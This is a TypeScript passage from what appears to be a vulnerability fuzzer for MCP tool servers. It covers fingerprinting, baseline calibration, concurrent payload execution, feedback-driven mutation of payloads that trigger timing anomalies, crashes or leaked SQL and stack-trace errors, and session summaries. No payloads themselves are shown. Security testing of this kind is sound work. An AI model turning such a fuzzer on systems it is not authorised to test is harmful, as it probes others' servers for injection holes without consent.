  generatePayloads(toolSchema?: Record<string, unknown>): GeneratedPayload[] {
    return this.generatePayloadsFromGenerators(
      this.config.generators,
      toolSchema,
    );
  }

  abort(reason = "User requested abort"): void {
    if (this.abortController) {
      this.abortController.abort();
      if (this.session) {
        this.session.aborted = true;
        this.session.abortReason = reason;
      }
    }
  }

  isRunning(): boolean {
    return (
      this.abortController !== null && !this.abortController.signal.aborted
    );
  }

  async runFingerprint(
    target: FuzzTarget,
    toolName: string,
  ): Promise<ServerFingerprint> {
    this.lastFingerprint = await this.fingerprinter.fingerprint(
      target,
      toolName,
    );
    return this.lastFingerprint;
  }

  getLastFingerprint(): ServerFingerprint | null {
    return this.lastFingerprint;
  }

  getSessionStats(): FuzzingSession | null {
    return this.session;
  }

  // -------------------------------------------------------------------------
  // Core fuzz() — now feedback-driven
  // -------------------------------------------------------------------------

  async fuzz(
    target: FuzzTarget,
    toolName: string,
    toolSchema?: Record<string, unknown>,
  ): Promise<FuzzingSession> {
    this.abortController = new AbortController();
    this.baseline = new ResponseBaseline();
    this.mutationRound = 0;

    // ── Fingerprinting phase ──────────────────────────────────────────────
    let activeGenerators = this.config.generators;
    let disabledGenerators: string[] = [];
    let fingerprint: ServerFingerprint | undefined;

    if (this.config.enableFingerprinting) {
      fingerprint = await this.fingerprinter.fingerprint(target, toolName);
      this.lastFingerprint = fingerprint;
      this.config.onFingerprint?.(fingerprint);

      const filtered = this.filterGeneratorsByFingerprint(
        this.config.generators,
        fingerprint,
      );
      activeGenerators = filtered.active;
      disabledGenerators = filtered.disabled;
    }

    // ── Payload generation ────────────────────────────────────────────────
    const initialPayloads = this.generatePayloadsFromGenerators(
      activeGenerators,
      toolSchema,
    );

    // ── Baseline calibration (NEW in v1.0) ───────────────────────────────
    // Send a small batch of low-risk payloads first to establish timing and
    // size baselines before anomaly detection activates.
    await this.calibrateBaseline(target, toolName, initialPayloads);

    // ── Session init ──────────────────────────────────────────────────────
    const feedbackStats: FeedbackStats = {
      interestingResponsesFound: 0,
      mutationsInjected: 0,
      mutationRoundsCompleted: 0,
      timingAnomaliesDetected: 0,
      structuralDriftDetected: 0,
      serverCrashesDetected: 0,
    };

    this.session = {
      id: this.generateSessionId(),
      startedAt: new Date(),
      totalPayloads: initialPayloads.length, // grows dynamically
      payloadsExecuted: 0,
      vulnerabilities: [],
      payloadsByCategory: this.countByCategory(initialPayloads),
      errors: [],
      aborted: false,
      fingerprint,
      disabledGenerators:
        disabledGenerators.length > 0 ? disabledGenerators : undefined,
      feedbackStats,
      // eslint-disable-next-line @typescript-eslint/ban-ts-comment
      // @ts-ignore - feedbackStats is not part of FuzzingSession in v1 but we added it in fuzz.ts
    };

    // ── Dynamic payload queue ─────────────────────────────────────────────
    const queue = new DynamicPayloadQueue();
    queue.enqueueNormal(initialPayloads);

    let foundVulnerability = false;

    // ── Main loop ─────────────────────────────────────────────────────────
    // We cannot use PromisePool.run() directly with a dynamic list, so we
    // drive the pool manually using a "work supplier" pattern: while the
    // queue is non-empty we keep pulling items and submitting them to the
    // pool, respecting concurrency via an in-flight counter.
    await this.runDynamicPool(
      queue,
      target,
      toolName,
      feedbackStats,
      () => foundVulnerability,
      (found) => {
        foundVulnerability = found;
      },
    );

    // ── Finalise ──────────────────────────────────────────────────────────
    this.session.endedAt = new Date();
    this.abortController = null;

    return this.session;
  }

  // -------------------------------------------------------------------------
  // NEW — Dynamic pool runner (replaces static PromisePool.run)
  // -------------------------------------------------------------------------

  /**
   * Drive payload execution with a concurrency limit while allowing the queue
   * to grow during execution (mutation injection).
   */
  private async runDynamicPool(
    queue: DynamicPayloadQueue,
    target: FuzzTarget,
    toolName: string,
    feedbackStats: FeedbackStats,
    isVulnerabilityFound: () => boolean,
    setVulnerabilityFound: (v: boolean) => void,
  ): Promise<void> {
    const session = this.session!;
    const concurrency = this.config.concurrency;

    return new Promise((resolve) => {
      let inFlight = 0;

      const trySchedule = () => {
        // Drain as many items as concurrency allows
        while (
          inFlight < concurrency &&
          !queue.isEmpty() &&
          !this.abortController!.signal.aborted &&
          !(this.config.stopOnFirstVulnerability && isVulnerabilityFound())
        ) {
          const payload = queue.dequeue();
          if (!payload) break;

          inFlight++;
          this.executeOne(payload, target, toolName, queue, feedbackStats)
            .then(({ vulnFound }) => {
              if (vulnFound) setVulnerabilityFound(true);
            })
            .catch((err: unknown) => {
              const fuzzError: FuzzingError = {
                payload,
                message: err instanceof Error ? err.message : String(err),
                stack: err instanceof Error ? err.stack : undefined,
                code: (err as NodeJS.ErrnoException).code,
                timestamp: new Date(),
              };
              session.errors.push(fuzzError);
              session.payloadsExecuted++;
              this.emitProgress(queue, session);
            })
            .finally(() => {
              inFlight--;
              // Update the session's total to reflect mutations added to queue
              session.totalPayloads = queue.totalEnqueued;

              if (queue.isEmpty() && inFlight === 0) {
                resolve();
              } else {
                trySchedule();
              }
            });
        }

        // If nothing is in-flight and the queue is empty OR we are stopped, we're done
        if (inFlight === 0) {
          const isStopped =
            this.abortController!.signal.aborted ||
            (this.config.stopOnFirstVulnerability && isVulnerabilityFound());

          if (queue.isEmpty() || isStopped) {
            resolve();
          }
        }
      };

      // Delay between batches if configured
      const scheduleWithDelay = () => {
        if (this.config.delayBetweenRequests > 0) {
          setTimeout(trySchedule, this.config.delayBetweenRequests);
        } else {
          trySchedule();
        }
      };

      void scheduleWithDelay;
      trySchedule();
    });
  }

  // -------------------------------------------------------------------------
  // NEW — Single payload execution with feedback loop
  // -------------------------------------------------------------------------

  private async executeOne(
    payload: GeneratedPayload,
    target: FuzzTarget,
    toolName: string,
    queue: DynamicPayloadQueue,
    feedbackStats: FeedbackStats,
  ): Promise<{ vulnFound: boolean }> {
    const session = this.session!;
    let vulnFound = false;

    const result = await target.execute(payload);

    // ── QUOTA PROTECTION: Detect 429 errors and abort immediately ──────────────
    // Check for HTTP 429 errors or JSON-RPC rate limit errors
    if (result.isError && result.error) {
      const errorStr = String(result.error).toLowerCase();
      // HTTP 429 detection
      if (
        errorStr.includes("429") ||
        errorStr.includes("too many requests") ||
        errorStr.includes("rate limit")
      ) {
        session.aborted = true;
        session.abortReason = "API_QUOTA_EXCEEDED";
        this.abort("API quota exceeded (429 Too Many Requests)");
        throw new Error("PANIC_STOP_429");
      }
    }

    // Check JSON-RPC response for rate limit errors
    if (result.response && typeof result.response === "object") {
      const resp = result.response as Record<string, unknown>;
      if (resp.error && typeof resp.error === "object") {
        const err = resp.error as Record<string, unknown>;
        const errorCode = err.code;
        const errorMessage = String(err.message || "").toLowerCase();
        // JSON-RPC rate limit codes: -32000 to -32099 (server errors)
        // Common rate limit messages
        if (
          (typeof errorCode === "number" &&
            (errorCode === -32000 || errorCode === 429)) ||
          errorMessage.includes("rate limit") ||
          errorMessage.includes("too many requests") ||
          errorMessage.includes("quota exceeded")
        ) {
          session.aborted = true;
          session.abortReason = "API_QUOTA_EXCEEDED";
          this.abort("API quota exceeded (JSON-RPC rate limit error)");
          throw new Error("PANIC_STOP_429");
        }
      }
    }

    // ── Step 1: Analyse the response immediately (hoisted from feedback loop)
    // This must happen before the detectors run so that the EngineHint is
    // available to every detector for the current response.
    const analysis = this.analyzeResponse(result, payload);

    // ── Step 2: Record baseline stats (hoisted — was inside feedback-loop block)
    // Always record, regardless of whether the feedback loop is enabled, so the
    // baseline stays accurate for the analyzeResponse thresholds.
    this.baseline.record(result.responseTimeMs, analysis.responseSizeBytes);

    // ── Step 3: Build the EngineHint from the analysis and payload metadata ──
    // Detectors can use these pre-computed signals as corroborating evidence
    // without having to re-derive them from the raw response independently.
    const engineHint = {
      isAnomaly: analysis.interestLevel !== "not_interesting",
      anomalyReasons: analysis.reasons,
      isMutation: payload.metadata?.["isMutation"] === true,
      mutationStrategy:
        typeof payload.metadata?.["mutationStrategy"] === "string"
          ? (payload.metadata["mutationStrategy"] as string)
          : undefined,
      originalCategory:
        typeof payload.metadata?.["originalCategory"] === "string"
          ? (payload.metadata["originalCategory"] as string)
          : payload.category,
      engineBaselineMs: analysis.averageResponseTimeMs,
    };

    // ── Step 4: Vulnerability detection — context now carries the EngineHint ─
    const context: DetectorContext = {
      payload: payload.value,
      toolName,
      response: result.response,
      responseTimeMs: result.responseTimeMs,
      isError: result.isError,
      error: result.error,
      engineHint,
    };

    for (const detector of this.config.detectors) {
      if (detector.isApplicable(payload.category)) {
        const detection = detector.detect(context);
        if (detection.detected) {
          session.vulnerabilities.push(detection);
          this.config.onVulnerability?.(detection, payload);
          vulnFound = true;
        }
      }
    }

    // ── Step 5: Feedback loop — reuses `analysis` calculated in Step 1 ───────
    // Note: analyzeResponse is NOT called again here; `analysis` is reused.
    if (this.config.enableFeedbackLoop) {
      if (analysis.interestLevel !== "not_interesting") {
        feedbackStats.interestingResponsesFound++;

        // Update specific counters
        if (analysis.reasons.includes("timing_anomaly"))
          feedbackStats.timingAnomaliesDetected++;
        if (analysis.reasons.includes("structural_drift"))
          feedbackStats.structuralDriftDetected++;
        if (analysis.reasons.includes("server_crash"))
          feedbackStats.serverCrashesDetected++;

        // Notify caller
        this.config.onInterestingResponse?.(analysis, payload);

        // Inject mutations if we haven't exceeded the round limit
        const isMutation = payload.metadata?.["isMutation"] === true;
        const currentRound =
          typeof payload.metadata?.["mutationRound"] === "number"
            ? (payload.metadata["mutationRound"] as number)
            : 0;

        if (!isMutation || currentRound < this.config.maxMutationRounds) {
          const nextRound = isMutation ? currentRound + 1 : 1;
          const mutations = this.mutationEngine.mutate(
            payload,
            analysis.reasons,
            nextRound,
          );

          if (mutations.length > 0) {
            queue.enqueueHigh(mutations);
            feedbackStats.mutationsInjected += mutations.length;

            if (nextRound > feedbackStats.mutationRoundsCompleted) {
              feedbackStats.mutationRoundsCompleted = nextRound;
            }
          }
        }
      }
    }

    session.payloadsExecuted++;
    this.emitProgress(queue, session);

    return { vulnFound };
  }

  // -------------------------------------------------------------------------
  // NEW — analyzeResponse
  // -------------------------------------------------------------------------

  /**
   * Evaluate a single execution result and determine whether it is
   * interesting enough to warrant mutation follow-up.
   *
   * Decision matrix:
   *
   *   server_crash        → HIGH PRIORITY  (internal error / MCP crash)
   *   empty_response      → HIGH PRIORITY  (silent crash or hang)
   *   timing_anomaly      → MEDIUM         (Blind SQLi / ReDoS candidate)
   *   structural_drift    → MEDIUM         (injection changed the response)
   *   error_pattern_match → MEDIUM         (stack trace or DB error leaked)
   */
  private analyzeResponse(
    result: {
      response: unknown;
      responseTimeMs: number;
      isError: boolean;
      error?: { code: number; message: string };
    },
    payload: GeneratedPayload,
  ): ResponseAnalysis {
    const reasons: InterestReason[] = [];

    // Serialise response for size comparison
    const responseStr =
      result.response != null ? JSON.stringify(result.response) : "";
    const responseSizeBytes = Buffer.byteLength(responseStr, "utf8");
    const averageTimeMs = this.baseline.averageTimeMs;
    const baselineSizeBytes = this.baseline.averageSizeBytes;

    // ── 1. Server crash detection ─────────────────────────────────────────
    if (result.isError && result.error) {
      const code = result.error.code;
      // MCP internal error (-32000 to -32099) or JSON-RPC server error (-32603)
      if (code === -32603 || (code >= -32099 && code <= -32000)) {
        reasons.push("server_crash");
      }
    }

    // ── 2. Empty / null response ──────────────────────────────────────────
    if (
      !result.isError &&
      (result.response == null || responseStr === "{}" || responseStr === '""')
    ) {
      reasons.push("empty_response");
    }

    // ── 3. Timing anomaly ─────────────────────────────────────────────────
    if (this.baseline.isWarmedUp) {
      const exceedsAbsolute =
        result.responseTimeMs > this.config.timingAnomalyThresholdMs;

      // Prevent jitter on fast connections (e.g. 2ms -> 7ms) from triggering anomalies
      // Only apply multiplier if the response is at least 200ms (or threshold/10)
      const minDuration = Math.min(
        200,
        this.config.timingAnomalyThresholdMs / 10,
      );

      const exceedsMultiplier =
        averageTimeMs > 0 &&
        result.responseTimeMs >
          averageTimeMs * this.config.timingAnomalyMultiplier &&
        result.responseTimeMs > minDuration;

      if (exceedsAbsolute || exceedsMultiplier) {
        reasons.push("timing_anomaly");
      }
    }

    // ── 4. Structural drift ───────────────────────────────────────────────
    if (this.baseline.isWarmedUp && baselineSizeBytes > 0) {
      const sizeDelta =
        Math.abs(responseSizeBytes - baselineSizeBytes) / baselineSizeBytes;
      if (sizeDelta > this.config.structuralDriftThreshold) {
        reasons.push("structural_drift");
      }
    }

    // ── 5. Error pattern matching ─────────────────────────────────────────
    // Look for database / stack trace leakage in the response body
    const ERROR_PATTERNS = [
      /SQL syntax|mysql_fetch|ORA-\d{5}|pg_exec/i,
      /stack trace|at \w+\.\w+\s*\(/,
      /exception in thread|unhandled exception/i,
      /internal server error/i,
      /\beval\b.*\bfailed\b/i,
    ];
    if (ERROR_PATTERNS.some((re) => re.test(responseStr))) {
      reasons.push("error_pattern_match");
    }

    // ── Compute interest level ────────────────────────────────────────────
    let interestLevel: InterestLevel = "not_interesting";
    if (
      reasons.includes("server_crash") ||
      reasons.includes("empty_response")
    ) {
      interestLevel = "high_priority";
    } else if (reasons.length > 0) {
      interestLevel = "interesting";
    }

    return {
      interestLevel,
      reasons,
      responseTimeMs: result.responseTimeMs,
      averageResponseTimeMs: averageTimeMs,
      responseSizeBytes,
      baselineSizeBytes,
      payload,
    };
  }

  // -------------------------------------------------------------------------
  // NEW — Baseline calibration
  // -------------------------------------------------------------------------

  /**
   * Run the first N payloads synchronously (concurrency=1) to build a
   * stable baseline before anomaly detection activates.
   * Uses low-risk payloads (skip mutations and critical severity items).
   */
  private async calibrateBaseline(
    target: FuzzTarget,
    toolName: string,
    payloads: GeneratedPayload[],
  ): Promise<void> {
    const CALIBRATION_SAMPLES = 5;
    const candidates = payloads
      .filter((p) => p.severity === "low" || p.severity === "medium")
      .slice(0, CALIBRATION_SAMPLES);

    for (const payload of candidates) {
      try {
        const result = await target.execute(payload);
        const size = Buffer.byteLength(
          result.response != null ? JSON.stringify(result.response) : "",
          "utf8",
        );
        this.baseline.record(result.responseTimeMs, size);
      } catch {
        // Calibration errors are silently ignored — we move on
      }
    }
  }

  // -------------------------------------------------------------------------
  // Progress emission helper
  // -------------------------------------------------------------------------

  private emitProgress(
    queue: DynamicPayloadQueue,
    session: FuzzingSession,
  ): void {
    const total = queue.totalEnqueued;
    this.config.onProgress?.({
      current: session.payloadsExecuted,
      total,
      percentage:
        total > 0 ? Math.round((session.payloadsExecuted / total) * 100) : 0,
      vulnerabilitiesFound: session.vulnerabilities.length,
      errorsEncountered: session.errors.length,
      mutationsQueued: queue.highSize,
      mutationRound: this.mutationRound,
    });
  }

  // -------------------------------------------------------------------------
  // getSessionSummary (extended with feedback stats)
  // -------------------------------------------------------------------------

  getSessionSummary(): string | null {
    if (!this.session) return null;

    const duration = this.session.endedAt
      ? (this.session.endedAt.getTime() - this.session.startedAt.getTime()) /
        1000
      : 0;

    const fb = this.session.feedbackStats;

    const lines = [
      `Session   : ${this.session.id}`,
      `Duration  : ${duration.toFixed(2)}s`,
      `Payloads  : ${this.session.payloadsExecuted}/${this.session.totalPayloads}`,
      `Vulns     : ${this.session.vulnerabilities.length}`,
      `Errors    : ${this.session.errors.length}`,
    ];

    if (this.session.aborted) {
      lines.push(`Aborted   : ${this.session.abortReason}`);
    }

    lines.push(
      "",
      "── Feedback Loop ──────────────────────────────",
      `Interesting responses : ${fb.interestingResponsesFound}`,
      `Mutations injected    : ${fb.mutationsInjected}`,
      `Mutation rounds       : ${fb.mutationRoundsCompleted}`,
      `Timing anomalies      : ${fb.timingAnomaliesDetected}`,
      `Structural drifts     : ${fb.structuralDriftDetected}`,
      `Server crashes        : ${fb.serverCrashesDetected}`,
    );

    if (this.session.fingerprint) {
      lines.push("", "── Fingerprint ────────────────────────────────");
      lines.push(`  ${this.session.fingerprint.summary}`);
      if (this.session.disabledGenerators?.length) {
        lines.push(`  Disabled: ${this.session.disabledGenerators.join(", ")}`);
      }
    }

    lines.push("", "── By Category ────────────────────────────────");
    for (const [cat, count] of Object.entries(
      this.session.payloadsByCategory,
    )) {
      lines.push(`  ${cat}: ${count}`);
    }

    if (this.session.vulnerabilities.length > 0) {
      lines.push("", "── Vulnerabilities ────────────────────────────");
      const bySeverity: Record<string, number> = {};
      for (const v of this.session.vulnerabilities) {
        bySeverity[v.severity] = (bySeverity[v.severity] ?? 0) + 1;
      }
      for (const [sev, count] of Object.entries(bySeverity)) {
        lines.push(`  ${sev}: ${count}`);
      }
    }

    return lines.join("\n");
  }

  // -------------------------------------------------------------------------
  // Private helpers (unchanged)
  // -------------------------------------------------------------------------

  private generatePayloadsFromGenerators(
    generators: IPayloadGenerator[],
    toolSchema?: Record<string, unknown>,
  ): GeneratedPayload[] {
    const all: GeneratedPayload[] = [];
    for (const gen of generators) {
      if (toolSchema && gen.generateForSchema) {
        all.push(
          ...gen.generateForSchema(toolSchema, this.config.generatorConfig),
        );
      } else {
        all.push(...gen.generate(this.config.generatorConfig));
      }
    }
    return all;
  }

  private filterGeneratorsByFingerprint(
    generators: IPayloadGenerator[],
    fingerprint: ServerFingerprint,
  ): { active: IPayloadGenerator[]; disabled: string[] } {
    const disabled = new Set(fingerprint.disabledGenerators);
    return {
      active: generators.filter((g) => !disabled.has(g.constructor.name)),
      disabled: generators
        .filter((g) => disabled.has(g.constructor.name))
        .map((g) => g.constructor.name),
    };
  }

  private generateSessionId(): string {
    return `fuzz-${Date.now()}-${Math.random().toString(36).substring(2, 11)}`;
  }

  private countByCategory(
    payloads: GeneratedPayload[],
  ): Record<string, number> {
    const counts: Record<string, number> = {};
    for (const p of payloads) {
      counts[p.category] = (counts[p.category] ?? 0) + 1;
    }
    return counts;
  }
}
